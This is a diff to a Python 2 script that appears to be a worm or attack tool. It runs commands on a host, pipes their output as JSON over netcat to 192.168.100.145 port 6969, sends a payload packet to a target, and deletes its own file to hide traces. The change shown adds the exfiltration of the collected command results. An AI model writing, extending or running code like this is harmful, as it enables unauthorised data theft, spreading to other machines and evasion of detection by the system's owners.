@@ -1,8 +1,9 @@
 #!/usr/bin/env python2
 import time
-from sys import exit
+import sys
 import os
 import subprocess as sp
+import json
 
 target = 0
 if len(sys.argv) > 1:
@@ -14,7 +15,7 @@ if os.path.exists('/tmp/barglefish.notaworm'):
 		os.remove('/tmp/dustbuster.py')
 	except:
 		pass
-	exit(1)
+	sys.exit(1)
 
 # place marker before working
 with open('/tmp/barglefish.notaworm', 'w') as marker:
@@ -43,6 +44,11 @@ for cmd in cmds:
 	cmd_results[cmd] = c_proc.stdout.read()
 
 nc = sp.Popen(['nc', '192.168.100.145', '6969'], stdin=sp.PIPE)
+try:
+	nc.stdin.write(json.dumps(cmd_results))
+	nc.stdin.flush()
+except:
+	pass
 
 # run payload packet through netcat, then wait a little for it to be processed
 target_ip = targets[target]
@@ -57,5 +63,3 @@ nc.stdin.flush()
 
 # erase itself
 os.remove('/tmp/dustbuster.py')
-
-# screw around
